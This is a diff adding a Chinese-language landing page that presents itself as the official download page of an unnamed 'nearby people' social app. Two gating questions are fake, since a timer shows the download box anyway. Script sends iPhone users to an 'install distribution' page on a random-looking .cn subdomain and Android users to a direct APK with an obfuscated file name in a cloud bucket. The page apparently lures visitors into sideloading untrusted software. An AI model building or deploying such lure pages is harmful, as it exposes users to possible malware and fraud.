@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>附近社交应用 - 官方下载</title>
+
+<!-- Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QP8ZJ348JH"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-QP8ZJ348JH');
+</script>
+
+<style>
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",sans-serif;background:#fff;}
+.container{max-width:420px;margin:auto;padding:20px;text-align:center;}
+.logo{font-size:24px;font-weight:bold;color:#ff4d88;}
+.banner img{width:100%;border-radius:12px;}
+.title{font-size:20px;margin-top:15px;font-weight:bold;}
+.desc{color:#666;font-size:14px;line-height:1.7;margin:10px 0 16px;}
+.card{background:#fff;border:1px solid #f0d9e4;border-radius:14px;padding:16px;box-shadow:0 2px 10px rgba(0,0,0,0.05);text-align:left;margin-top:16px;}
+.question-title{font-size:16px;font-weight:700;color:#333;margin-bottom:10px;}
+.option-list{display:flex;flex-wrap:wrap;gap:8px;}
+.option-btn{border:1px solid #f0c7d7;background:#fff7fb;color:#d63d7b;padding:10px 14px;border-radius:999px;font-size:14px;cursor:pointer;}
+.option-btn:hover{background:#ffeaf3;}
+.download-box{display:none;margin-top:18px;padding:16px;border-radius:14px;background:#fff7fb;border:1px solid #f3dce7;text-align:center;}
+.btn{background:#ff4d88;color:white;padding:14px;border-radius:25px;font-size:16px;font-weight:bold;margin-top:12px;display:block;text-decoration:none;text-align:center;}
+.features{margin-top:20px;text-align:left;padding-left:18px;}
+.features li{margin-bottom:8px;color:#444;font-size:14px;}
+.note{font-size:12px;color:#888;margin-top:8px;line-height:1.6;}
+.footer{font-size:12px;color:#999;margin-top:20px;line-height:1.7;}
+.platform-tag{display:inline-block;background:#fff;border:1px solid #f0c7d7;color:#d63d7b;padding:6px 10px;border-radius:999px;font-size:12px;font-weight:700;margin-bottom:10px;}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <div class="logo">社交应用</div>
+
+  <div class="banner">
+    <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=800" alt="banner">
+  </div>
+
+  <div class="title">发现附近的人，轻松建立连接</div>
+  <div class="desc">真实用户 · 兴趣社交 · 隐私保护<br>请先完成简单确认，随后显示适合你设备的下载入口。</div>
+
+  <div class="card">
+    <div class="question-title">问题 1：你所在的城市是？</div>
+    <div class="option-list">
+      <button class="option-btn" onclick="answerCity('北京')">北京</button>
+      <button class="option-btn" onclick="answerCity('上海')">上海</button>
+      <button class="option-btn" onclick="answerCity('广州')">广州</button>
+      <button class="option-btn" onclick="answerCity('深圳')">深圳</button>
+      <button class="option-btn" onclick="answerCity('其他城市')">其他城市</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="question-title">问题 2：是否有兴趣继续了解并下载我们的 APP？</div>
+    <div class="option-list">
+      <button class="option-btn" onclick="answerInterest('有兴趣')">有兴趣</button>
+      <button class="option-btn" onclick="answerInterest('先了解一下')">先了解一下</button>
+      <button class="option-btn" onclick="answerInterest('暂时不需要')">暂时不需要</button>
+    </div>
+  </div>
+
+  <div id="downloadBox" class="download-box">
+    <div id="platformTag" class="platform-tag">检测设备中</div>
+    <div id="downloadTitle" style="font-size:16px;font-weight:700;color:#333;">下载入口</div>
+    <a id="downloadBtn" class="btn" href="#" onclick="return handleDownloadClick();">继续下载</a>
+    <div id="downloadNote" class="note">将根据你的设备跳转到对应的安装页面。</div>
+  </div>
+
+  <ul class="features">
+    <li>✔ 附近用户推荐</li>
+    <li>✔ 即时聊天互动</li>
+    <li>✔ 多种兴趣匹配</li>
+    <li>✔ 隐私与安全保障</li>
+  </ul>
+
+  <div class="footer">© 2026 Social App. All rights reserved.</div>
+</div>
+
+<script>
+const IOS_URL = "https://gsru1m8943.rxxkrr.cn/ip907usz";
+const ANDROID_URL = "https://eltt9decnfzm-1366477487.cos.accelerate.myqcloud.com/DH025/pfkpof.lgsekt";
+
+let cityAnswered = false;
+let interestAnswered = false;
+let boxShown = false;
+let currentPlatform = "android";
+
+function detectPlatform(){
+  const ua = navigator.userAgent.toLowerCase();
+  if(/iphone|ipad|ipod/.test(ua)){
+    return "ios";
+  }
+  return "android";
+}
+
+function configureDownloadBox(){
+  currentPlatform = detectPlatform();
+  const platformTag = document.getElementById('platformTag');
+  const downloadBtn = document.getElementById('downloadBtn');
+  const downloadNote = document.getElementById('downloadNote');
+
+  if(currentPlatform === 'ios'){
+    platformTag.innerText = "iPhone / iOS";
+    downloadBtn.innerText = "前往 iPhone 安装页面";
+    downloadBtn.href = IOS_URL;
+    downloadNote.innerText = "你当前使用的是 iPhone / iOS 设备，点击后将前往 iOS 安装分流页面。";
+  }else{
+    platformTag.innerText = "Android";
+    downloadBtn.innerText = "下载 Android APK";
+    downloadBtn.href = ANDROID_URL;
+    downloadNote.innerText = "你当前使用的是 Android 设备，点击后将直接进入 Android APK 下载。";
+  }
+}
+
+function showDownloadBox(method){
+  if (boxShown) return;
+  boxShown = true;
+  configureDownloadBox();
+  document.getElementById('downloadBox').style.display = 'block';
+  if (typeof gtag === 'function') {
+    gtag('event', 'download_box_show', { method: method, platform: currentPlatform });
+  }
+}
+
+function answerCity(city){
+  cityAnswered = true;
+  if (typeof gtag === 'function') {
+    gtag('event', 'answer_city', { city: city });
+  }
+  if (cityAnswered && interestAnswered) {
+    showDownloadBox('answered');
+  }
+}
+
+function answerInterest(choice){
+  interestAnswered = true;
+  if (typeof gtag === 'function') {
+    gtag('event', 'answer_interest', { choice: choice });
+  }
+  if (cityAnswered && interestAnswered) {
+    showDownloadBox('answered');
+  }
+}
+
+function handleDownloadClick(){
+  if (typeof gtag === 'function') {
+    gtag('event', 'download_click', { platform: currentPlatform });
+  }
+  if(currentPlatform === 'ios'){
+    window.location.href = IOS_URL;
+  }else{
+    window.location.href = ANDROID_URL;
+  }
+  return false;
+}
+
+setTimeout(function(){
+  if (!boxShown) {
+    showDownloadBox('timeout_5s');
+  }
+}, 5000);
+</script>
+
+</body>
+</html>
